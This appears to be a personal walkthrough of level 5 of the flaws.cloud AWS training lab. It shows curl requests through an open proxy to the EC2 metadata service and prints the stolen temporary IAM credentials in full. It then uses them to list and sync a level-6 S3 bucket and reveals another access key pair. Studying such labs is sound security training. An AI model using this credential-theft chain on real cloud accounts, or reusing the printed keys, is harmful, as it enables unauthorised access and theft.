# Flaws.cloud Level 5

Status: Done
Assign: Dcyberguy

## Level 5

![image.png](image%208.png)

There is mention of on an `EC2 has a simple HTTP only proxy on it`. Let’s check the `EC2 instance Metadata service`

```json
curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws | jq
HTTP/1.1 200 OK
Server: nginx/1.10.3 (Ubuntu)
Date: Fri, 23 Jan 2026 20:57:00 GMT
Content-Type: text/plain
Content-Length: 1570
Connection: keep-alive
Accept-Ranges: none
Last-Modified: Fri, 23 Jan 2026 20:50:20 GMT

{
  "Code": "Success",
  "LastUpdated": "2026-01-23T20:49:43Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIA6GG7PSQG4IXPM5DE",
  "SecretAccessKey": "3kW+bKzK82jmsIFIuZ0ly8J+pD9O4jt9WskYZRkP",
  "Token": "IQoJb3JpZ2luX2VjEDUaCXVzLXdlc3QtMiJHMEUCIQDZMQihtnfnaW293HYbf/PBfjTekZ2pJkT6XHAyk3cZ5AIgTZAgOh7mz8dZ1JHfmcqFqJ7T1t7P5NHV4j4oowzjlGUquwUI/v//////////ARAEGgw5NzU0MjYyNjIwMjkiDADYatxGEdINjEEwkyqPBY7M8lVPJuq5UyXjfWVehZv/sZFW5YR+H+YFF9Ys+leW3rPGRxrYXv5Wj4DeOnJmLdjfQZUum6CaIjJhPH/3fNAY8kvNrhMc01UwCJ4Y57rwrGhTtPxTkQIMadP5IjlgYIj70qkS5O2s2VzgWgX+B6Nx83K8MUU/0W/Car3Xo5ZA4ZQkPFpvwA1UDENe085Q6IFYiirUaV+FU1Gs0Qcaq3oqPsTdjTrOK46gYYQvXyMOaIBconjrAU1vYRjDHWq/RcFhl2G5/HkAeoZxL8/jDuZnbIbQmNqXXRVV/LQNRF7OtdBWJ6zZQvu39/tAOGAW4VhnV7Meg7XPB6kjW4xyORNjQ9Z7UH/XLQJvfoAjU2ex1hDi++jrJ+W10unZl1j0nx1qda4+808aw2Cp86+AmYQ8RV+0xgQkNP0jBaxrff493VwNPPKKeWkLVyvEU3bNjJirLWmRuHEasCJDVto2OVFvj7HQ3HiA/bpcolmZtxGo4GiOSZZWFKJCQB+tzP+vSbjCwuFcWJuflpkMpnQlwOESZoVW3dwI3ggxANiYihYfvOGDdD+i5zzKF3n0qthG9BiSAm2RWyMyukf8Y0xJRaqzDasKwOIcM8ZExGb5jYm6Ax08I7X9REjwhm3fUnKasEiW2F8qfJohoHCs6uFfRNj2HGmNo8sacTb19JNN7PZQ0gp1zE8DQUMIv1mrxzebsAm3kKsDSfDBZ9ju15vWhB+/HBcIChQ7OnUsxMExPkRHmTsQAUBeB2ZUzM0aK2AgCGb67B4pE7jsosRRbIr+/bGUKpx+PZg7w/8Ln5uMNaXFjWMuzApm7CVmlZAcCwhcCQETFk5z6VWwpyNPEo/NNxd2UInIZ/ypzXImVyICwYwwjL7PywY6sQGEgNnaMN0thTEUAsKRsHKLmbj+gy8V7IuY+lkBX//fFKZwKOfPSyjcPnpjZBjwofSgRVkWX75L3BNR5KGAfpncGmqM7MxqgKXKuQY/F8T8TQzC1LpXoFL4GypE39ZXVZBBJbFsORgn9jIDcBScspZbBT4PW0DdXjkKK1p3Byo3tUEcWRASUI+zCYwMYNqgicFXIuXqgG85uFjC+abZJBK99XUgldIK2d4adJNpt0EqgKY=",
  "Expiration": "2026-01-24T03:04:03Z"
}

```

Manually added the above short-termed creds to my `.aws/credential` file, and it worked

```json
aws sts get-caller-identity --profile flawsv2 | jq
{
  "UserId": "AROAI3DXO3QJ4JAWIIQ5S:i-05bef8a081f307783",
  "Account": "975426262029",
  "Arn": "arn:aws:sts::975426262029:assumed-role/flaws/i-05bef8a081f307783"
}

```

They also provided a level6 link. So I can list all s3 bucket 

```json
aws s3 ls s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud --profile flawsv2
                           PRE ddcc78ff/
2017-02-26 21:11:07        871 index.html

```

I see a folder `ddcc78ff`. Let’s dump all the content of that folder using the `sync` command.

```json
aws s3 --profile flawsv2 sync s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff /home/kali
warning: Skipping file /home/kali/.cache/ibus/dbus-TfK15UJ0. File is character special device, block special device, FIFO, or socket.
warning: Skipping file /home/kali/.cache/ibus/dbus-pOgS4XPF. File is character special device, block special device, FIFO, or socket.
warning: Skipping file /home/kali/.cache/ibus/dbus-tlH4lvQ7. File is character special device, block special device, FIFO, or socket.
warning: Skipping file /home/kali/.cache/ibus/dbus-KxfTp8Oo. File is character special device, block special device, FIFO, or socket.
warning: Skipping file /home/kali/.cache/ibus/dbus-Ih6mefs0. File is character special device, block special device, FIFO, or socket.
warning: Skipping file /home/kali/.cache/ibus/dbus-XfWCMC0u. File is character special device, block special device, FIFO, or socket.
warning: Skipping file /home/kali/.cache/ibus/dbus-GtODLejG. File is character special device, block special device, FIFO, or socket.
warning: Skipping file /home/kali/.mozilla/firefox/9efjeiqd.default-esr/lock. File does not exist.
download: s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/index.html to ./index.html
download: s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/hint2.html to ./hint2.html
download: s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/hint1.html to ./hint1.html

```

Looking at the `index.html` file, we are presented with another `AWS ACCESS KEYS`

![image.png](image%209.png)

```json
Access key ID: AKIAJFQ6E7BY57Q3OBGA<br>
Secret: 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<br>
```